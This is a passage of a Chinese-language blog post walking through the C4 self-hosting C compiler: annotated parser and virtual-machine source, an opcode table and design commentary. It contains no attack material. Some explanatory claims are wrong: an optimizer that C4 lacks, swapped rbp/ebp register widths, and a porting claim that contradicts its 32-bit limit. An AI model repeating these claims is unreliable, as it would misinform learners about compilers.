printf(&quot;</span>%d: bad <span class="keyword">enum</span> initializer\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            i = ival;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">//將目前的標識加入符號表中</span></span><br><span class="line"><span class="string">          id[Class] = Num; id[Type] = INT; id[Val] = i++;</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();//還沒結束,跳過逗號</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//解析函數宣告或變數定義</span></span><br><span class="line"><span class="string">//處理 Global variables and Functions。</span></span><br><span class="line"><span class="string">    while (tk != &#x27;;&#x27; &amp;&amp; tk != &#x27;&#125;&#x27;) &#123;</span></span><br><span class="line"><span class="string">      ty = bt;</span></span><br><span class="line"><span class="string">// tk == Mul 表示已*開頭,為指針類型,型別加PTR表示何種類型的指針</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;</span></span><br><span class="line"><span class="string">//check 是否有重複宣告，是屬於 semantic analyzer 的一部份。</span></span><br><span class="line"><span class="string">      if (tk != Id) &#123; printf(&quot;</span>%d: bad global declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">      if (id[Class]) &#123; printf(&quot;</span>%d: duplicate global definition\n<span class="string">&quot;, line); return -1; &#125;//重複全域變數定義,解釋見後</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      id[Type] = ty;//賦值型別</span></span><br><span class="line"><span class="string">//這邊開始處理 Function declaration。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;(&#x27;) &#123; // 函數</span></span><br><span class="line"><span class="string">//Symbol table 的 class 設定為 Fun 類型，然後將 value 設定為 IR command 的 下個指令(Function 第一個指令)的位址。</span></span><br><span class="line"><span class="string">        id[Class] = Fun;//型別為函數型</span></span><br><span class="line"><span class="string">        id[Val] = (int)(e + 1);//函數指標? 在字節碼中的偏移量/位址</span></span><br><span class="line"><span class="string">        next(); i = 0;</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">這邊會檢查是否重複宣告 parameter。</span></span><br><span class="line"><span class="string">然後將 Symbol table 的資訊 (Class, type, Val) 備份到 HClass, HType, HVal，</span></span><br><span class="line"><span class="string">這邊是實作在 function 內部更改 local variable’s value 將不會影響到 Function 以外的 scope，parameter 也算是 Function local variables。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">        while (tk != &#x27;)&#x27;) &#123;//參數列表</span></span><br><span class="line"><span class="string">          ty = INT;</span></span><br><span class="line"><span class="string">          if (tk == Int) next();</span></span><br><span class="line"><span class="string">          else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">          while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad parameter declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">					if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate parameter definition\n<span class="string">&quot;, line); return -1; &#125;//函數參數是局部變量</span></span><br><span class="line"><span class="string">          id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">          id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">          id[HVal]   = id[Val];   id[Val] = i++;//局部變數編號</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        if (tk != &#x27;&#123;&#x27;) &#123; printf(&quot;</span>%d: bad function definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">        loc = ++i;//局部變數偏移量</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        while (tk == Int || tk == Char) &#123;//函數內變數聲明</span></span><br><span class="line"><span class="string">          bt = (tk == Int) ? INT : CHAR;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          while (tk != &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">            ty = bt;</span></span><br><span class="line"><span class="string">            while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//處理指標型</span></span><br><span class="line"><span class="string">            if (tk != Id) &#123; printf(&quot;</span>%d: bad local declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate local definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">//備份符號訊息</span></span><br><span class="line"><span class="string">            id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">            id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">            id[HVal]   = id[Val];   id[Val] = ++i;//儲存變數偏移量</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        *++e = ENT; *++e = i - loc;//函式局部變數數目</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) stmt();//語法分析</span></span><br><span class="line"><span class="string">        *++e = LEV;//函數回傳,解析完畢,彈棧</span></span><br><span class="line"><span class="string">        id = sym; //恢復全域變數的訊息</span></span><br><span class="line"><span class="string">        while (id[Tk]) &#123;</span></span><br><span class="line"><span class="string">//恢復符號訊息</span></span><br><span class="line"><span class="string">          if (id[Class] == Loc) &#123;</span></span><br><span class="line"><span class="string">            id[Class] = id[HClass];</span></span><br><span class="line"><span class="string">            id[Type] = id[HType];</span></span><br><span class="line"><span class="string">            id[Val] = id[HVal];</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          id = id + Idsz;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else &#123;</span></span><br><span class="line"><span class="string">        id[Class] = Glo;//全域變數</span></span><br><span class="line"><span class="string">        id[Val] = (int)data;//給全域變數在data段分配內存</span></span><br><span class="line"><span class="string">        data = data + sizeof(int);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if (!(pc = (int *)idmain[Val])) &#123; printf(&quot;</span>main() not defined\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string">  if (src) return 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 設定堆疊</span></span><br><span class="line"><span class="string">  sp = (int *)((int)sp + poolsz);</span></span><br><span class="line"><span class="string">  *--sp = EXIT; // 如果main回傳則呼叫exit</span></span><br><span class="line"><span class="string">  *--sp = PSH; t = sp;</span></span><br><span class="line"><span class="string">  *--sp = argc;</span></span><br><span class="line"><span class="string">  *--sp = (int)argv;</span></span><br><span class="line"><span class="string">  *--sp = (int)t;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // run...</span></span><br><span class="line"><span class="string">  cycle = 0;</span></span><br><span class="line"><span class="string">  while (1) &#123;</span></span><br><span class="line"><span class="string">    i = *pc++; ++cycle;</span></span><br><span class="line"><span class="string">    if (debug) &#123;</span></span><br><span class="line"><span class="string">//運算</span></span><br><span class="line"><span class="string">      printf(&quot;</span>%d&gt; %.<span class="number">4</span>s<span class="string">&quot;, cycle,</span></span><br><span class="line"><span class="string">        &amp;&quot;</span>LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,<span class="string">&quot;[i * 5]);</span></span><br><span class="line"><span class="string">      if (i &lt;= ADJ) printf(&quot;</span> %d\n<span class="string">&quot;, *pc); else printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//記憶體結構</span></span><br><span class="line"><span class="string">    if      (i == LEA) a = (int)(bp + *pc++);                             // load local address</span></span><br><span class="line"><span class="string">    else if (i == IMM) a = *pc++;                                         // load global address or immediate</span></span><br><span class="line"><span class="string">    else if (i == JMP) pc = (int *)*pc;                                   // jump</span></span><br><span class="line"><span class="string">    else if (i == JSR) &#123; *--sp = (int)(pc + 1); pc = (int *)*pc; &#125;        // jump to subroutine</span></span><br><span class="line"><span class="string">    else if (i == BZ)  pc = a ? pc + 1 : (int *)*pc;                      // branch if zero</span></span><br><span class="line"><span class="string">    else if (i == BNZ) pc = a ? (int *)*pc : pc + 1;                      // branch if not zero</span></span><br><span class="line"><span class="string">    else if (i == ENT) &#123; *--sp = (int)bp; bp = sp; sp = sp - *pc++; &#125;     // enter subroutine</span></span><br><span class="line"><span class="string">    else if (i == ADJ) sp = sp + *pc++;                                   // stack adjust</span></span><br><span class="line"><span class="string">    else if (i == LEV) &#123; sp = bp; bp = (int *)*sp++; pc = (int *)*sp++; &#125; // leave subroutine</span></span><br><span class="line"><span class="string">    else if (i == LI)  a = *(int *)a;                                     // load int</span></span><br><span class="line"><span class="string">    else if (i == LC)  a = *(char *)a;                                    // load char</span></span><br><span class="line"><span class="string">    else if (i == SI)  *(int *)*sp++ = a;                                 // store int</span></span><br><span class="line"><span class="string">    else if (i == SC)  a = *(char *)*sp++ = a;                            // store char</span></span><br><span class="line"><span class="string">    else if (i == PSH) *--sp = a;                                         // push</span></span><br><span class="line"><span class="string">//執行流程</span></span><br><span class="line"><span class="string">    else if (i == OR)  a = *sp++ |  a;</span></span><br><span class="line"><span class="string">    else if (i == XOR) a = *sp++ ^  a;</span></span><br><span class="line"><span class="string">    else if (i == AND) a = *sp++ &amp;  a;</span></span><br><span class="line"><span class="string">    else if (i == EQ)  a = *sp++ == a;</span></span><br><span class="line"><span class="string">    else if (i == NE)  a = *sp++ != a;</span></span><br><span class="line"><span class="string">    else if (i == LT)  a = *sp++ &lt;  a;</span></span><br><span class="line"><span class="string">    else if (i == GT)  a = *sp++ &gt;  a;</span></span><br><span class="line"><span class="string">    else if (i == LE)  a = *sp++ &lt;= a;</span></span><br><span class="line"><span class="string">    else if (i == GE)  a = *sp++ &gt;= a;</span></span><br><span class="line"><span class="string">    else if (i == SHL) a = *sp++ &lt;&lt; a;</span></span><br><span class="line"><span class="string">    else if (i == SHR) a = *sp++ &gt;&gt; a;</span></span><br><span class="line"><span class="string">    else if (i == ADD) a = *sp++ +  a;</span></span><br><span class="line"><span class="string">    else if (i == SUB) a = *sp++ -  a;</span></span><br><span class="line"><span class="string">    else if (i == MUL) a = *sp++ *  a;</span></span><br><span class="line"><span class="string">    else if (i == DIV) a = *sp++ /  a;</span></span><br><span class="line"><span class="string">    else if (i == MOD) a = *sp++ %  a;</span></span><br><span class="line"><span class="string">//輸入輸出函數，包括了檔案讀寫、螢幕輸出等函數</span></span><br><span class="line"><span class="string">    else if (i == OPEN) a = open((char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == READ) a = read(sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == CLOS) a = close(*sp);</span></span><br><span class="line"><span class="string">    else if (i == PRTF) &#123; t = sp + pc[1]; a = printf((char *)t[-1], t[-2], t[-3], t[-4], t[-5], t[-6]); &#125;</span></span><br><span class="line"><span class="string">    else if (i == MALC) a = (int)malloc(*sp);</span></span><br><span class="line"><span class="string">    else if (i == FREE) free((void *)*sp);</span></span><br><span class="line"><span class="string">    else if (i == MSET) a = (int)memset((char *)sp[2], sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == MCMP) a = memcmp((char *)sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == EXIT) &#123; printf(&quot;</span><span class="built_in">exit</span>(%d) cycle = %d\n<span class="string">&quot;, *sp, cycle); return *sp; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>unknown instruction = %d! cycle = %d\n<span class="string">&quot;, i, cycle); return -1; &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>它具備完整的詞法分析、語法分析、簡單的語意檢查、程式碼產生、執行環境（即虛擬機器）。</p>
<p>與常見的C編譯器不同的是，它把C語言原始程式編譯成字節碼（bytecode），然後在一個精簡的虛擬機器中解釋執行。</p>
<p>C4特別的地方就是可以自己編譯自己</p>
<p>先用GCC把C4編譯成執行檔：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc c4.c -o c4</span><br></pre></td></tr></table></figure>

<p>執行「Hello, World!」測試程式hello.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello,world\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/c4_1.png" alt="Untitled"></p>
<p>「hello, world」是hello.c 輸出的，「exit(0) cycle &#x3D; 9」是c4編譯器輸出的，表示程式正常運作結束，hello.c一共產生9個指令。</p>
<p>用GCC編譯c4.c產生了可執行檔c4，稱為編譯器A，然後用編譯器A來編譯c4的源碼c4.c，則產生一個編譯器B，然後再用編譯器B來編譯執行hello.c。</p>
<p><img src="/img/c4_2.png" alt="Untitled"></p>
<p>命令如下：</p>
<p>.&#x2F;c4 c4.c hello.c</p>
<p><img src="/img/c4_3.png" alt="Untitled"></p>
<p>理論上可以一直遞歸下去。遞歸的層次越深，產生的字節碼越多，執行所需的時間也越多。</p>
<p>C4實作的C語言子集<br>C4致力於用最少的程式碼，實作一個可以自舉的C編譯器。它的整個實作只有4個函數組成，可想而知，它不可能完整的實作整個C語言的規範，它只實作了C語言的一個子集。</p>
<h3 id="資料類型"><a href="#資料類型" class="headerlink" title="資料類型"></a>資料類型</h3><ul>
<li>char</li>
<li>int</li>
<li>指針</li>
<li>列舉（enum）</li>
<li>陣列</li>
<li>字串</li>
<li>不支援struct、typedef、union等資料類型。</li>
</ul>
<h3 id="語句結構"><a href="#語句結構" class="headerlink" title="語句結構"></a>語句結構</h3><ul>
<li>if-else控制語句</li>
<li>while迴圈語句</li>
<li>return語句</li>
<li>函數</li>
<li>不支援do-while、switch-case、for、continue、break、goto等語句結構。</li>
</ul>
<h3 id="運算符"><a href="#運算符" class="headerlink" title="運算符"></a>運算符</h3><p>它支援除+&#x3D;、%&#x3D;、&lt;&lt;&#x3D;、&amp;&#x3D;等符合運算子之外的幾乎所有運算子。包括：</p>
<ul>
<li><p>算術運算符</p>
</li>
<li><p>關係運算符</p>
</li>
<li><p>邏輯運算符</p>
</li>
<li><p>位元運算符</p>
</li>
<li><p>賦值運算符</p>
</li>
<li><p>雜項運算子（如三元運算子?:）</p>
</li>
<li><p>內建庫函數</p>
</li>
<li><p>Virtual Machine (c4)</p>
<ul>
<li>sp：stack frame。</li>
<li>a：register 暫存器。</li>
<li>bp：概念跟 rbp(32 bits)&#x2F;ebp(64 bits) 相同。</li>
<li>pc：program counter，指向當前指令。</li>
<li>instuction：OPCODE。</li>
</ul>
</li>
</ul>
<h3 id="內建庫函數"><a href="#內建庫函數" class="headerlink" title="內建庫函數"></a>內建庫函數</h3><p>C4編譯器實作時用到了一些系統函式庫函數，因此，為了實現自舉，它也內建支援了幾個函式庫函數。包括：</p>
<p>open、read、close、printf、malloc、free、memset、memcmp、exit<br>需要注意的是，它不支援以#開頭的預處理命令，如#include、#define、#if等。</p>
<p>程式碼註釋只支援「&#x2F;&#x2F;」開頭的單行註釋，不支援「&#x2F;* *&#x2F;」標記的多行註解形式。</p>
<p>與傳統的C語言編譯器相比，C4在實作上有其獨到之處。</p>
<p>下面，先簡單介紹一些傳統編譯器的實作過程。</p>
<h3 id="傳統典型編譯器的實現"><a href="#傳統典型編譯器的實現" class="headerlink" title="傳統典型編譯器的實現"></a>傳統典型編譯器的實現</h3><p>典型的編譯器的實現，通常都會有下面幾個過程：</p>
<ul>
<li>詞法分析</li>
<li>語法分析</li>
<li>語意分析</li>
<li>中間程式碼生成</li>
<li>程式碼最佳化</li>
<li>機器碼生成</li>
<li>如GCC、Clang….</li>
</ul>
<p><img src="/img/c4_4.png" alt="Untitled"></p>
<p>這些階段，會對程式碼進行多次掃描。這裡的程式碼，包括文字形式的原始碼、語法樹、中間程式碼等表示形式。</p>
<p>在典型的實作中，詞法分析和語法分析通常會糅合在一起，在語法分析時，呼叫詞法分析器逐一取得token。因此，理論上講，詞法分析和語法分析階段，只需要對源碼掃描一遍即可，並生成語法樹，有時也叫抽象語法樹（Abstract Syntax Tree）。</p>
<p>語意分析階段操作的主要物件就是這棵樹，至少要對這棵樹掃描一次。有些實作中，在進行語意檢查的同時也會直接產生中間程式碼。</p>
<p>在程式碼最佳化階段，根據編譯器最佳化的力度的不同，可能會對中間程式碼進行多次掃描。</p>
<p>這裡所謂的“掃描一遍”，在編譯器術語中一般稱為pass。對LLVM有了解的朋友應該知道，LLVM中每一種類型的最佳化都是一個pass，要應用多種最佳化技術，就需要有多個pass。</p>
<h3 id="程式流程"><a href="#程式流程" class="headerlink" title="程式流程"></a>程式流程</h3><p>總結這個程式的流程﻿ 1. 詞法分析器：</p>
<ul>
<li>忽略空白字元</li>
<li>識別符號、關鍵字、運算符、常數、字串等</li>
<li>將識別符號雜湊並儲存在符號表中</li>
</ul>
<ol start="2">
<li><p>語法分析器：</p>
<ul>
<li>遞迴下降解析器</li>
<li>處理表達式、語句和函數定義</li>
<li>產生中間代碼（IR → Instruction register）</li>
</ul>
</li>
<li><p>IR 優化器：</p>
<ul>
<li>進行常數摺疊、公共子表達式消除等優化</li>
</ul>
</li>
<li><p>程式碼生成器：</p>
<ul>
<li>將 IR 轉換為目標機器碼</li>
</ul>
</li>
<li><p>虛擬機：</p>
<ul>
<li>模擬目標機器執行機器碼</li>
<li>提供除錯功能</li>
</ul>
</li>
</ol>
<h3 id="解析程式流程"><a href="#解析程式流程" class="headerlink" title="解析程式流程"></a><strong>解析程式流程</strong></h3><ol>
<li><strong>詞法分析</strong>：將原始碼切割成一個個的 token，並賦予其對應的 token number。</li>
</ol>
<ul>
<li>詞法分析器會逐個字元地掃描原始碼，並將字元組合成 token。</li>
<li>token 是原始碼中具有特定意義的字元序列，例如關鍵字、識別符號、運算符、分隔符等。</li>
<li>詞法分析器會將 token 分配給對應的 token number，以便後續的語法分析和語義分析。</li>
</ul>
<ol>
<li><strong>語法分析</strong>：將 token 組合起來，形成語法樹。</li>
</ol>
<ul>
<li>語法分析器會根據當前的 token 和語法規則，決定如何將 token 組合起來形成語法樹。</li>
<li>語法樹是一種樹狀結構，它表示原始碼的語法結構。</li>
<li>語法分析器會檢查語法樹是否符合語法規則，如果發現語法錯誤，則會報錯。</li>
</ul>
<ol>
<li><strong>語義分析</strong>：檢查語法樹是否符合語法規則，並產生對應的 IR (Intermediate Representation) 指令。</li>
</ol>
<ul>
<li>語義分析器會檢查語法樹是否符合語法規則，並產生對應的 IR 指令。</li>
<li>IR 指令是一種中間表示，它比機器碼更接近原始碼，但又比原始碼更接近機器碼。</li>
<li>IR 指令可以被編譯器轉換成機器碼。</li>
</ul>
<ol>
<li><strong>程式碼生成</strong>：將 IR 指令轉換成機器碼。</li>
</ol>
<ul>
<li>程式碼生成器會將 IR 指令轉換成機器碼。</li>
<li>機器碼是電腦可以直接執行的指令。</li>
</ul>
<ol>
<li><strong>執行</strong>：將機器碼載入到記憶體中，並執行。</li>
</ol>
<ul>
<li>執行器會將機器碼載入到記憶體中，並執行。</li>
<li>電腦會根據機器碼的指令，一步一步地執行程式。</li>
</ul>
<p>在這個專案程式中，詞法分析、語法分析、語義分析和代碼生成都是由同一個程式來完成的。</p>
<p>這個程式會逐行讀取原始碼，並將原始碼轉換成機器碼。然後，程式會將機器碼載入到記憶體中，並執行。</p>
<h3 id="C4的獨具特色之處"><a href="#C4的獨具特色之處" class="headerlink" title="C4的獨具特色之處"></a>C4的獨具特色之處</h3><p>作為追求極簡主義的C4編譯器來說，它在實作上有許多獨具特色之處。</p>
<h3 id="對C源碼解釋執行"><a href="#對C源碼解釋執行" class="headerlink" title="對C源碼解釋執行"></a>對C源碼解釋執行</h3><p>傳統的C語言編譯器，最後都把C語言原始碼編譯成可執行文件，也就是二進位的機器碼。</p>
<p>而C4則是把C語言原始碼先編譯成其專門設計的字節碼（bytecode），然後直接在虛擬機器中解釋執行。</p>
<p>C4設計了39個字節碼指令，其中大部分與彙編語言中的指令有些類似，主要是記憶體載入指令，算術運算指令等，此外，還包含了為支援內建的函式庫函數而專門設計的9條特殊的函式庫函數呼叫指令。</p>
<p>它的虛擬機是典型的堆疊式虛擬機（Java虛擬機也是典型的堆疊式虛擬機，早期的Lua也是棧式虛擬機，但最新的Lua 5.x採用暫存器虛擬機）。</p>
<p>可以使用-d指令，把產生的字節碼dump出來。下圖是hello.c的字節碼：</p>
<p><img src="/img/c4_5.png" alt="Untitled"></p>
<p><strong>對源碼只掃描一遍</strong></p>
<p>與傳統的編譯器實作不同，C4它把詞法分析、語法分析、語意分析、程式碼產生這幾個步驟巧妙的結合在一起，在把C語言源碼編譯成字節碼的整個過程中，只掃描了一遍源碼。</p>
<p>Lua的解釋器也是採用對原始碼掃描一遍的方式，因此，C4和Lua的表現都相當不錯。</p>
<h3 id="C4原始碼的可讀性"><a href="#C4原始碼的可讀性" class="headerlink" title="C4原始碼的可讀性"></a><strong>C4原始碼的可讀性</strong></h3><p>C4的實作非常簡潔，畢竟只有4個函數，500多行程式碼。但是要真正完全理解，需要有一定的編譯原理基礎知識。</p>
<p>例如C4的語法分析過程中，就是<strong>典型的遞歸下降和算子優先演算法結合</strong>的實作方式。只要了解這些編譯器的經典演算法原理，C4的實作邏輯理解起來，還是比較輕鬆的。</p>
<p>C4不支援struct類型。這也意味著C4的源碼中不能使用struct型別。為此，它選擇<strong>使用陣列</strong>來模擬struct結構。這樣乍看，可能會產生一些困惑。</p>
<p>C4的一個槽點，就是它變數的命名上，過於簡潔。例如標記字節碼的位置的變數用e表示，其實如果用emit的話，就會清晰許多，也會更容易理解。</p>
<h3 id="C4的衍生實現"><a href="#C4的衍生實現" class="headerlink" title="C4的衍生實現"></a>C4的衍生實現</h3><p>除了C4的原生實作外，網路上也有很多基於C4的衍生實作。</p>
<p>例如有人為C4額外增加了80多行程式碼，卻為C4增加了JIT功能，使得執行速度明顯提升。</p>
<p>也有人對C4做了簡單修改，使得它可以直接產生真實的機器碼，最後產生ELF執行檔。</p>
<h3 id="Virtual-Machine-Opcode"><a href="#Virtual-Machine-Opcode" class="headerlink" title="Virtual Machine (Opcode)"></a><strong>Virtual Machine (Opcode)</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// opcodes</span><br><span class="line">enum &#123; LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/pcp5DfL.png" alt="https://i.imgur.com/pcp5DfL.png"></p>
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Fully Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>LEA</td>
<td>Load Effective Address</td>
<td>利用 bp 將相對位址存入暫存器 a</td>
</tr>
<tr>
<td>IMM</td>
<td>Immediate Value</td>
<td>將 immediate value or global address 存入暫存器 a</td>
</tr>
<tr>
<td>JMP</td>
<td>Jump</td>
<td>跳轉至目標指令的絕對位址</td>
</tr>
<tr>
<td>JSR</td>
<td>Jump to SubRoutine</td>
<td>Push return address into sp and JMP</td>
</tr>
<tr>
<td>BZ</td>
<td>Branch if Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>BNZ</td>
<td>Branch if NOT Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>ENT</td>
<td>Enter SubRoutine</td>
<td>Push bp and bp points to sp，sp 會預留 local variables 的位置</td>
</tr>
<tr>
<td>ADJ</td>
<td>Stack Adjust</td>
<td>根據目前 sp 的相對位置</td>
</tr>
<tr>
<td>LEV</td>
<td>Leave SubRoutine</td>
<td>sp&#x3D;bp, bp points to old bp, 讀取 return address to pc, sp++釋放空間</td>
</tr>
<tr>
<td>LI</td>
<td>Load INT</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>LC</td>
<td>Load CHAR</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>SI</td>
<td>Store INT</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++</td>
</tr>
<tr>
<td>SC</td>
<td>Store CHAR</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++，最後再存入暫存器 a</td>
</tr>
<tr>
<td>PSH</td>
<td>Push into Stack Frame</td>
<td>將暫存器 a 的值 push into Stack Frame</td>
</tr>
<tr>
<td>OR-MODE</td>
<td>Arithmetic operation</td>
<td>pop from Stack Frame and calculate with register value, and then restore into regrister.</td>
</tr>
<tr>
<td>OPEN-MEMCMP</td>
<td>System Call</td>
<td>使用 Stack Frame sp 當作參數傳遞，並且 pop Stack</td>
</tr>
<tr>
<td>EXIT</td>
<td>exit program</td>
<td>利用 Stack Frame sp 當作回傳值</td>
</tr>
</tbody></table>
<p>• c4 在 <code>next()</code> Lexical analyzer 的時候就有包含 semantic analyzer，這時候會建立 symbol table；在 <code>main()</code> 會檢查是否重複定義；在 <code>expr()</code> 會做 type checking and undefined variable checking，這些部分也是屬於 semantic analyzer。</p>
<h3 id="stmt"><a href="#stmt" class="headerlink" title="stmt()"></a><strong>stmt()</strong></h3><p>利用 recursive-descent 處理 “if-else”, “while”, “return”, “{}”, “;”。這部分的 source code 非常直觀</p>
<p>其他參考資料</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lotabout/write-a-C-interpreter">https://github.com/lotabout/write-a-C-interpreter</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@srhuang/Bkk2eY5ES#main--declaration">https:&#x2F;&#x2F;hackmd.io&#x2F;@srhuang&#x2F;Bkk2eY5ES#main–declaration</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/blob/master/c4.c">https://github.com/rswier/c4/blob/master/c4.c</a></p>
<p><strong>特點：</strong></p>
<ul>
<li>簡單：僅用500餘行程式碼就實現了一個c編譯器。</li>
<li>類似解釋器：實現了自己的虛擬機器指令集，直接產生為目標程式碼，忽略中間程式碼的過程。</li>
<li>自舉：可以自己編譯自己。</li>
<li>只能在32位元環境下跑。</li>
<li>單趟編譯器：分析過程只有一遍。</li>
<li>語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。</li>
</ul>
<p><strong>分析：</strong></p>
<ul>
<li>c4編譯器是一個非常簡單的編譯器，但它實現了編譯器的基本原理，是一個很好的學習資源。</li>
<li>c4編譯器類似於解釋器，它直接產生為目標程式碼，忽略中間程式碼的過程。這使得它比傳統的編譯器更簡單，但執行速度也更慢。</li>
<li>c4編譯器可以自己編譯自己，這是一個非常強大的功能。它意味著c4編譯器可以移植到任何支援C語言的平臺上。</li>
<li>c4編譯器是單趟編譯器，這意味著它在遍歷原始程式碼時只會分析一遍。這使得c4編譯器非常快，但它也意味著c4編譯器不能檢測出所有的錯誤。</li>
<li>c4編譯器的語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。這使得c4編譯器的語法分析非常高效。</li>
</ul>
<p><strong>總結：</strong></p>
<p>c4編譯器是一個非常簡單、強大且高效的編譯器。它是一個很好的學習資源，也非常適合用於移植到其他平臺上。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="Brainfuck-Brainfuck" class="article article-type-Brainfuck" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Brainfuck/" class="article-date">
